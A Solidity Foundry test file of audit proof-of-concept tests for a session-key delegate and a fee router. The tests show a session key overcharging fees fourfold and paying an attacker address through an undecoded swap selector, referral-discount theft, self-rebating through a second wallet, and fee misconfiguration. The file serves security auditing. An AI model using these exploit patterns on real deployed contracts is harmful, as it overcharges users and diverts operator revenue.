// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {SessionKeyDelegate} from "../src/SessionKeyDelegate.sol";
import {FeeRouter, Route} from "../src/FeeRouter.sol";

contract MockERC20c {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract MockRouterC {
    MockERC20c public immutable tokenOut;
    constructor(MockERC20c o) { tokenOut = o; }
    function swapExactTokensForTokens(uint256 amountIn, uint256 min, Route[] calldata r, address to, uint256)
        external returns (uint256[] memory a)
    {
        MockERC20c(r[0].from).transferFrom(msg.sender, address(this), amountIn);
        uint256 out = amountIn * 2;
        require(out >= min, "slippage");
        tokenOut.mint(to, out);
        a = new uint256[](2); a[0] = amountIn; a[1] = out;
    }
}

/// Agent-2 (access control) re-audit PoCs — run against the CURRENT on-disk
/// contracts/src, including the isReferrer attestation added mid-audit.
contract ZZA2 is Test {
    MockERC20c tin;
    MockERC20c tout;
    MockRouterC router;
    FeeRouter fr;
    SessionKeyDelegate delegate; // acts as the EIP-7702 account itself

    address sessionKey = address(0x5E5510);
    address attacker = address(0xA77ACC);
    address operator = address(0xFEE);
    address user = address(0xBEEF);
    address realReferrer = address(0xF00D); // an honest, owner-attested referrer
    address freeloader = address(0xF4EE); // a trader with NO referrer at all

    bytes4 constant SEL_TRANSFER = bytes4(keccak256("transfer(address,uint256)"));
    bytes4 constant SEL_APPROVE = bytes4(keccak256("approve(address,uint256)"));
    // exactly what src/custody/delegation.ts grants on the FeeRouter target
    bytes4 constant SEL_SWAP_WITH_FEE =
        bytes4(keccak256("swapWithFee(uint256,uint256,(address,address,bool,address)[],uint256,address,uint16,uint16)"));

    function setUp() public {
        tin = new MockERC20c();
        tout = new MockERC20c();
        router = new MockRouterC(tout);
        fr = new FeeRouter(address(router), operator, 50, 3000); // feeBps=50, referred=45, maxShare=30%
        delegate = new SessionKeyDelegate();
        tin.mint(address(delegate), 1_000e18);
        tin.mint(user, 1_000e18);
        tin.mint(freeloader, 1_000e18);
        vm.prank(user);
        tin.approve(address(fr), type(uint256).max);
        vm.prank(freeloader);
        tin.approve(address(fr), type(uint256).max);
    }

    function _routes() internal view returns (Route[] memory r) {
        r = new Route[](1);
        r[0] = Route({from: address(tin), to: address(tout), stable: false, factory: address(0xFAC)});
    }

    function _attest(address who) internal {
        address[] memory a = new address[](1);
        a[0] = who;
        fr.setReferrers(a, true); // deployer == owner
    }

    // ── F1: delegate — swapWithFee is not in the decoded swap set ────────────

    function _installRealWorldScope() internal {
        SessionKeyDelegate.TargetPolicy[] memory p = new SessionKeyDelegate.TargetPolicy[](2);
        bytes4[] memory frSels = new bytes4[](1);
        frSels[0] = SEL_SWAP_WITH_FEE;
        p[0] = SessionKeyDelegate.TargetPolicy({
            target: address(fr), selectors: frSels, tokenPerTxCap: 0, tokenDailyCap: 0
        });
        bytes4[] memory tokSels = new bytes4[](2);
        tokSels[0] = SEL_APPROVE;
        tokSels[1] = SEL_TRANSFER;
        p[1] = SessionKeyDelegate.TargetPolicy({
            target: address(tin), selectors: tokSels, tokenPerTxCap: 100e18, tokenDailyCap: 150e18
        });
        vm.prank(address(delegate));
        delegate.registerSession(sessionKey, uint48(block.timestamp + 30 days), 1 ether, 2 ether, p);
    }

    /// The guard that SHOULD stop a payout to a non-target — it works for transfer().
    function test_A_directTransferToAttackerIsBlocked() public {
        _installRealWorldScope();
        vm.prank(sessionKey);
        vm.expectRevert(abi.encodeWithSelector(SessionKeyDelegate.SpenderNotAllowed.selector, attacker));
        delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_TRANSFER, attacker, 1e18));
    }

    /// ...and swapWithFee walks straight past it: 4x fee overcharge, unmetered,
    /// plus a payout to a non-allowlisted address as soon as any referrer exists.
    function test_B_swapWithFeeIsUndecoded() public {
        _attest(attacker); // steady state: the operator attests referrers
        _installRealWorldScope();

        vm.prank(sessionKey);
        delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_APPROVE, address(fr), 100e18));
        uint256 ringBefore = delegate.tokenUsage(sessionKey, address(fr));

        vm.prank(sessionKey);
        delegate.execute(
            address(fr), 0,
            abi.encodeWithSelector(
                SEL_SWAP_WITH_FEE,
                uint256(100e18), uint256(0), _routes(), block.timestamp + 600,
                attacker, uint16(10_000), uint16(200) // MAX_OVERRIDE_BPS
            )
        );

        // fee = 2% of 100e18 = 2e18 (headline is 0.5% = 0.5e18) -> 4x overcharge.
        assertEq(tin.balanceOf(attacker), 0.6e18, "30% of the inflated fee -> non-allowlisted address");
        assertEq(tin.balanceOf(operator), 1.4e18, "user charged 200 bps, not 50");
        assertEq(delegate.tokenUsage(sessionKey, address(fr)), ringBefore, "nothing metered for the call");
    }

    /// Even with NO referrer attested, the key still forces the 4x overcharge.
    function test_B2_feeOverrideUnconstrainedWithoutAnyReferrer() public {
        _installRealWorldScope();
        vm.prank(sessionKey);
        delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_APPROVE, address(fr), 100e18));
        vm.prank(sessionKey);
        delegate.execute(
            address(fr), 0,
            abi.encodeWithSelector(
                SEL_SWAP_WITH_FEE,
                uint256(100e18), uint256(0), _routes(), block.timestamp + 600,
                address(0), uint16(0), uint16(200)
            )
        );
        assertEq(tin.balanceOf(operator), 2e18, "200 bps charged where the policy advertises 50");
    }

    // ── F2: isReferrer has no writer in the repo -> program is inert ─────────

    /// A genuinely referred trade (referrer recorded off-chain) is charged the
    /// FULL rate and the referrer is paid NOTHING, because nothing ever calls
    /// setReferrers. swapBuilder still ledgers a 30% referral payout.
    function test_C_unattestedReferralSilentlyOvercharges() public {
        vm.prank(user);
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, realReferrer, 3000, 0);
        assertEq(tin.balanceOf(operator), 0.5e18, "charged 50 bps, quote said 45");
        assertEq(tin.balanceOf(realReferrer), 0, "referrer paid nothing, ledger credits 30%");
    }

    // ── F3: isReferrer is a global flag, not a trader->referrer binding ──────

    function test_D_anyTraderCanClaimAnyAttestedReferrer() public {
        _attest(realReferrer); // honest referrer, publicly visible via isReferrer()

        // A trader with no referral relationship whatsoever names them.
        vm.prank(freeloader);
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, realReferrer, 10_000, 0);

        // fee = 45 bps (discount unlocked), 30% diverted.
        assertEq(tin.balanceOf(realReferrer), 0.135e18, "share diverted on an unrelated trade");
        assertEq(tin.balanceOf(operator), 0.315e18, "operator keeps 31.5 bps vs the 50 bps owed");
        assertEq(((0.5e18 - uint256(0.315e18)) * 100) / 0.5e18, 37, "37% operator revenue loss");
    }

    /// `referrer != msg.sender` is defeated by one extra wallet: the attacker
    /// gets themselves attested (the program attests anyone who refers), then
    /// trades from a second address naming their own attested wallet.
    function test_E_selfRebateViaSecondWallet() public {
        _attest(attacker);
        vm.prank(freeloader); // freeloader and attacker are the same person
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, attacker, 10_000, 0);
        assertEq(tin.balanceOf(attacker), 0.135e18, "rebated to a wallet the trader controls");
    }

    // ── F4: the floor cannot express the zap half-leg rate ───────────────────

    function test_F_zapHalfLegUnderpaidFiftyPercent() public {
        // src/surfaces/zap.ts sends zapFeeBpsOverride = min(effBps*2, 200) = 100.
        vm.prank(user);
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 100);
        assertEq(tin.balanceOf(operator), 1e18, "intended zap fee on the half-leg");

        // The plain-swap rate clears the floor (50 >= feeBps 50) -> half the fee.
        vm.prank(user);
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 50);
        assertEq(tin.balanceOf(operator), 1.5e18, "only half the zap fee collected");
    }

    // ── LEAD: setConfig clobbers a custom referredFeeBps ─────────────────────

    function test_G_setConfigClobbersCustomDiscount() public {
        fr.setReferredFeeBps(20); // owner deliberately sets a 20 bps referred rate
        assertEq(fr.referredFeeBps(), 20);
        fr.setConfig(address(0xFEE2), 50, 3000); // change ONLY the fee recipient
        assertEq(fr.referredFeeBps(), 45, "silently re-derived to 90% of headline");
    }
}
